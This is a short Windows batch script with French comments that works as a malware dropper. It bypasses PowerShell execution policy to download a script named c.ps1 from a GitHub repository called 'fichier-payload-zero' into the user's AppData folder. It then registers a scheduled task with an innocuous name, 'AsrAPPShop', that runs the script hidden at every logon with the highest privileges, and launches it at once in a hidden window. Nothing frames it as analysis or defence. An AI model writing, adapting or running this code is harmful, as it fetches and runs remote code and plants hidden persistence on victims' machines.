@echo off
REM 1. Téléchargement forcé de c.ps1 dans le dossier AppData\Roaming de l'utilisateur actuel
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/skyymat/fichier-payload-zero/refs/heads/main/c.ps1' -OutFile \"$env:APPDATA\c.ps1\" -UseBasicParsing"

REM 2. Petite pause pour garantir l'écriture complète du fichier sur le disque
timeout /t 2 /nobreak >nul

REM 3. Création propre de la tâche planifiée de persistance avec un chemin dynamique universel
powershell -NoProfile -ExecutionPolicy Bypass -Command "$p = Join-Path$env:APPDATA 'c.ps1'; Schtasks /Create /TN 'AsrAPPShop' /TR \"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `\"$p`\"\" /SC ONLOGON /RL HIGHEST /F"

REM 4. Lancement immédiat pour valider
start /min powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%APPDATA%\c.ps1"
